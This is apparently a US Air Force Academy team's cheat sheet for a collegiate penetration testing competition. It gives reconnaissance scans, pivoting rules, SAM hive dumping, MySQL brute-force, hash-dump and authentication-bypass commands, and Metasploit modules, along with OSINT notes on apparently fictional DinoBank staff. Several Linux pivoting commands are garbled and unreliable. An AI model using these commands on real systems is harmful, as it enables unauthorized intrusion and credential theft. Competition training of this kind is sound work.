# US Air Force Academy Collegiate Penetration Testing Competition Packet

## Google Drive Structure

`Deconfliction`

| Name  | IP Address | Type of Attack | Completed | Description |
| ----- | ---------- | -------------- | --------- | ----------- |
| Sears | 8.8.8.8    | Cyber Nuke     | Yes/No    | Example     |
| ...   | ...        | ...            | ...       | ...         |

`Persistence`

| Name  | Victim IP:Port | Callback IP:Port | Type         | Notes   | Location      |
| ----- | -------------- | ---------------- | ------------ | ------- | ------------- |
| Sears | 8.8.8.8:420    | 192.168.1.1:6969 | Reverse/Bind | Example | /tmp/hack.exe |
| ...   | ...            | ...              | ...          | ...     | ...           |

`[name] Notetaker`

```
IP:
User:
Type of Exploit: Initial / Privilege Escalation / Pivot / Information Disclosure etc.
Complete: Yes / No
Stuff to change back:
Walkthrough: include commands, screenshots, other notes, etc.
```

## VDI Setup

### Windows VDI

1. Go to https://github.com/fireeye/commando-vm
2. Download and extract ZIP in Downloads
3. Download `profile.json` and `profile_full.json` from https://github.com/nationalcptc-teamtools/United-States-Air-Force-Academy to the same folder
4. Run this in PowerShell as admin:

```powershell
Set -ExecutionPolicy Unrestricted
A
cd ${Env:UserProfile}\Downloads\commando-vm-master\commando-vm-master\
.\install.ps1 -profile_file .\profile.json -password <windows_password>
R
Y
N
.\install.ps1 -profile_file .\profile_full.json # for more tools
```

### Linux VDI

[Optional] In a terminal:

```sh
sudo su - # makes you root
apt-get install git
git clone https://github.com/1N3/Sn1per.git
cd Sn1per
bash install_debian_ubuntu.sh # there will be a couple prompts after
```

Whenever starting a new terminal, choose a new file name to log your terminal to:

```sh
script <filename>
exit # to save changes to file (might save anyways)
```

## Reconnaissance

Initial scan (paste in a Google Doc):

```sh
nmap <ip_range> -T1 -F -oN scan_short
```

Much longer scan (paste in a Google Doc):

```sh
nmap <ip_range> -T1 -p- -A -oN scan_long
```

Dump traffic (use WinSCP on Windows to retrieve the PCAP and open it in Wireshark):

```sh
ifconfig # find name of interface
tcpdump -i <interface> -s 65535 -w dump.pcap
```

[Optional] Quickly detect vulnerable services:

```sh
nmap -T1 -p- -sV -oX searchsploit.xml <ip_range>; searchsploit --nmap searchsploit.xml
```

[Optional] Enumerate subdomains:

```sh
spyse -target <domain> --subdomains
```

## Pivoting

Listen is on thing you want to pivot through, connect is target after hop.

For Windows:

```
netsh interface portproxy add v4tov4 listenport=6969 listenaddress=192.168.174.135 connectport=22 connectaddress=192.168.174.134 protocol=tcp
```

To remove:

```
netsh interface portproxy delete v4tov4 listenport=6969 listenaddress=192.168.174
```

For Linux:

```sh
echo "1" /proc/sjs/net/lpv4/lp forward
iptables -t nat -A PREROUTING -p tcp -i ethO -j DNAT -d <pivot_ip> --dport 443 -to-destination <attack_ip> :443
iptables -t nat -A POSTROUTING -p tcp -i ethC -j SNAT -s <target> <subnet> <cidr> -d <attack_ip> ---dport 443 -to-source <pivot_ip>
iptables -t filter -I FORWARD 1 -j ACCEPT
```

## Windows SAM

Second location is where to save to.

```
reg save hklm\sam c:\sam
reg save hklm\system c:\system
samdump2
```

## MySQL

### Port Reference

| Default Port/Protocol | Description                                          | SSL or other encryption |
| --------------------- | ---------------------------------------------------- | ----------------------- |
| 3306/tcp              | MySQL client to MySQL server                         | Yes                     |
| 3306/tcp              | MySQL router to MySQL server                         | Yes (inherited)         |
| 33060/tcp             | MySQL client to MySQL server (MySQL X protocol)      | Yes                     |
| 33061/tcp             | MySQL Group Replication internal communications port | Yes                     |
| 33062/tcp             | Specifically for MySQL administrative connections    | Yes                     |
| 6446/tcp              | Any SQL from the MySQL client to MySQL Router        | Yes (inherited)         |

### Nmap attacks

Get info:

```sh
nmap --script=mysql-info <target>
```

Empty password for `root` or `anonymous`:

```sh
nmap -sV --script=mysql-empty-password <target>
```

Bruteforce attack:

```sh
nmap -p3306 --script=mysql-brute --script-args userdb=<user_list_file>,passdb=<pass_list_file> <target>
```

Retrieve all password hashes:

```sh
nmap -p3306 <target> --script=mysql-dump-hashes --script-args username=<username>,password=<password>
```

Get database names:

```sh
nmap -p3306 <target> --script=mysql-databases --script-args mysqluser=<username>,mysqlpass=<password>
```

### Authentication Bypass

Works on:

- Oracle MySQL `5.1.x before 5.1.63, 5.5.x before 5.5.24, and 5.6.x before 5.6.6`
- MariaDB `5.1.x before 5.1.62, 5.2.x before 5.2.12, 5.3.x before 5.3.6, and 5.5.x before 5.5.23`

```sh
mysql --host=<target> -u root mysql --password=blah
```

### Metasploit Modules

- `auxiliary/scanner/mysql/mysql_login` - bruteforce username/password
- `auxiliary/scanner/mysql/mysql_hashdump` - dump hashes

## FTP

FTP is transmitted in plaintext, so you can sniff username and password.

Common usernames are `ftp`, `anonymous`, and passwords could be an email address.

### Metasploit Modules

- `auxiliary/scanner/ftp/anonymous` - check for anonymous login
- `auxiliary/scanner/ftp/ftp_version` - enumerates banner
- `auxiliary/scanner/ftp/ftp_login` - bruteforce username/password

## Redis

Runs on port 6379. CLI:

```sh
redis-cli -h <host> -a <password>
```

Important files:

- `installdir/redis/etc/redis.conf`
- `installdir/redis/var/log/redis-server.log`
- `/var/lib/redis`
- `/etc/redis.conf`
- `.rediscli_history`

```
/etc/redis.conf
	requirepass PASSWORD
and in slave:
	masterpass  master_password
	requirepass slave_password
```

## OSINT

### People

- https://www.linkedin.com/in/cale-strickland-b89947191 
  - Operations
  - Greater Seattle Area
  - <https://www.reddit.com/user/DinoCale>
  - <https://www.pinterest.com/dinocale/>
  - <https://www.tumblr.com/blog/dinocale>
  - <https://github.com/DinoCale>
    - HelloWorld repo -> .gitignore using Erlang
- https://www.linkedin.com/in/ruth-brooks-65700b192/
  - Bank Secrecy Act (BSA) 
  - Las Vegas,  Nevada Area
- https://www.linkedin.com/in/jamie-davenport-3788b8192/
  - EVP and Chief Operations Officer at DinoBank 
  - San Francisco Bay Area
- https://www.linkedin.com/in/alex-faulkner-343509192 -- uses IFTTT
  - Chief Information Officer at DinoBank 
  - Greater Seattle Area
  - https://www.linkedin.com/company/remitly/
  - <https://twitter.com/AlexFaulkner17>
- https://www.linkedin.com/in/dahlia-dawson-06600a192/
  - Compliance and Ethics Officer at DinoBank 
  - Las Vegas, Nevada Area (Linkedin), apparently NY everywhere else?
  - <https://www.facebook.com/dahlia.dawson.357>
  - <https://twitter.com/dawlia7>
- https://www.linkedin.com/in/meredith-sournoise-9b95b8192
  - Director Marketing Communications at DinoBank 
  - Cleveland/Akron, Ohio Area
  - Ohio University 2012-2015 MBA
  - <https://twitter.com/merefromthebank>
  - <https://www.linkedin.com/in/meredithfrormthebank/>
- https://www.linkedin.com/in/dan-oliver-98a942191
  - Compliance Department Director at DinoBank 
  - Greater Seattle Area
  - <https://www.reddit.com/user/dino_dan_oliver>
  - <https://www.pinterest.com/dinodanoliver/>
  - <https://github.com/DinoDanOliver>
  - <https://dino-dan-oliver.tumblr.com/>
- https://www.linkedin.com/in/heather-potter-b8290b191/
  - Marketing Director at DinoBank 
  - Greater Seattle Area
- <https://www.linkedin.com/in/ariel-robinson-154b50192/>
  - Internal Investigations at DinoBank 
  - Greater Seattle Area
- <https://www.linkedin.com/in/lawrence-hayden-161504192/>
  - Chief Executive Officer at DinoBank
  - Greater Chicago Area
  - Texas A&M University. 1998 - 2002
- <https://www.linkedin.com/in/mitchell-zamora-0a150a192/>
  - Business Risk Officer at DinoBank 
  - Houston, Texas Area
- <https://www.linkedin.com/in/abril-reyess-ab04b2192/>
  - Business Risk Officer at DinoBank 
  - Houston, Texas Area
- <https://www.linkedin.com/in/johnathan-gay-8a2066192/>
  - SVP and Chief Risk Officer at DinoBank 
  - Greater Chicago Area
- <https://www.linkedin.com/in/easton-brennan-6b600b192/>
  - Bank Secrecy Act Officer at DinoBank 
  - Greater Seattle Area
  - <https://www.facebook.com/easton.brennan.98>
  - <https://www.twitter.com/brennan_easton>
- <https://www.linkedin.com/in/precious-braun-5144b2192/>
  - Consumer Banking Director at DinoBank 
  - Rochester, New York Area
- <https://www.linkedin.com/in/tom-dickson-52a0b0193/>
  - Senior Information Security Officer at DinoBank
  - Great Seattle Area
- <https://www.linkedin.com/in/paul-alvarado-5308b7192/>
  - Corporate Banking Director at DinoBank
- <https://www.linkedin.com/in/isaiah-grimes-5628b6192/>
  - Audit Committee Member at DinoBank
  - Mansfield, Ohio Area
- https://www.linkedin.com/in/samara-romero-b268b6192
  - Director Of Business Development at DinoBank
  - Greater New York City Area
- <https://www.linkedin.com/in/mauren-davenport-62500a192/>
  - Information Security Officer at DinoBank
  - Greater Los Angeles Area
- DINOMEGAN
  - <https://www.reddit.com/user/dinomegan>
  - <https://www.pinterest.com/dinomegan8323>
  - <https://www.tumblr.com/blog/dinomegan>
  - <https://github.com/dinomegan>
- Slade Hunter
  - <https://www.reddit.com/user/DinoSladeHunter>
  - <https://www.pinterest.com/dinosladehunter>
  - <https://www.tumblr.com/blog/dinosladehunter>
  - <https://github.com/DinoSladeHunter>
- McKayla Pearson
  - <https://www.facebook.com/mckayla.pearson.927>​
### Other Stuff


Website - http://www.dinobank.us/ (Wordpress)

- http://www.dinobank.us/phpmyadmin/
- http://www.dinobank.us/wp-admin/
* **Gotham Office**
  1337 Fintech Ave.
  Gotham, NY 10010
  (123) 456-7890
- **Metropolis Office**
  9001 Exchange St
  Metropolis, NY, 1o103
  (456) 789-0123
  
- **Springfield Office**
  8088 Centre Court
  Springfield, IL, 11001
  (789) 012-3456

### Githubs

https://github.com/DinoDanOliver/bluekeep-exploit
https://github.com/dino-alex-faulkner/dino -- what EVERYONE uses as a chat app
https://github.com/Dino-Bank/HelloWorld
https://github.com/DinoDanOliver/.files/
https://etherscan.io/address/0xfd77ee88f5678553a575b7302c48e9aba9597d8c#code - smart contract, shortens to https://bit.ly/2M34TaT

Private SSH key: https://bit.ly/2VvkiUB

## External References

https://bit.ly/3117FS9 - various helpful red teaming resources

https://doc.lagout.org/ - various PDFs, including RTFM

https://bit.ly/2kSQao0 - various vulnerabilities, mostly web

https://lzone.de/cheat-sheet/ - various cheat sheets

https://devhints.io/ - more cheat sheets

https://devdocs.io/ - more detailed cheat sheets

https://www.robvanderwoude.com/ntadmincommands.php - commands for Windows admins